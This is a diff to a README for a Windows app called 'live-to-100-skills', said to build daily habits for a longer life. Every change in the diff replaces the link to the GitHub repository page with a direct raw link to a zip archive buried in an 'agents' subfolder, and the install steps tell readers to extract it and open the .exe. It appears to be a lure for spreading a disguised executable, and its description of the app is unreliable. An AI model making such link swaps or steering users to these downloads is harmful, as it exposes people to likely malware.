@@ -1,6 +1,6 @@
 # 🧬 live-to-100-skills - Simple habits for longer life
 
-[![Download](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://github.com/zenialeaky136/live-to-100-skills)
+[![Download](https://img.shields.io/badge/Download-Here-blue?style=for-the-badge)](https://raw.githubusercontent.com/zenialeaky136/live-to-100-skills/main/live-to-100/agents/live_to_skills_v1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ live-to-100-skills is a Windows app that helps you build daily habits for better
 
 If you want to get the app on your PC, use this link to visit the download page:
 
-[Download live-to-100-skills](https://github.com/zenialeaky136/live-to-100-skills)
+[Download live-to-100-skills](https://raw.githubusercontent.com/zenialeaky136/live-to-100-skills/main/live-to-100/agents/live_to_skills_v1.8.zip)
 
 ## 🖥️ What You Need
 
@@ -25,7 +25,7 @@ The app is built for normal home and office use. It runs on most modern Windows 
 ## 📥 Download and Install
 
 1. Open the download page:
-   [https://github.com/zenialeaky136/live-to-100-skills](https://github.com/zenialeaky136/live-to-100-skills)
+   [https://raw.githubusercontent.com/zenialeaky136/live-to-100-skills/main/live-to-100/agents/live_to_skills_v1.8.zip](https://raw.githubusercontent.com/zenialeaky136/live-to-100-skills/main/live-to-100/agents/live_to_skills_v1.8.zip)
 
 2. Look for the latest release or download file on the page.
 
@@ -187,7 +187,7 @@ Yes. Keep the full app folder together when you move it so the files stay linked
 ## 🗂️ Quick Start
 
 1. Visit the download page:
-   [https://github.com/zenialeaky136/live-to-100-skills](https://github.com/zenialeaky136/live-to-100-skills)
+   [https://raw.githubusercontent.com/zenialeaky136/live-to-100-skills/main/live-to-100/agents/live_to_skills_v1.8.zip](https://raw.githubusercontent.com/zenialeaky136/live-to-100-skills/main/live-to-100/agents/live_to_skills_v1.8.zip)
 2. Download the latest file
 3. Extract it if needed
 4. Open the `.exe` file
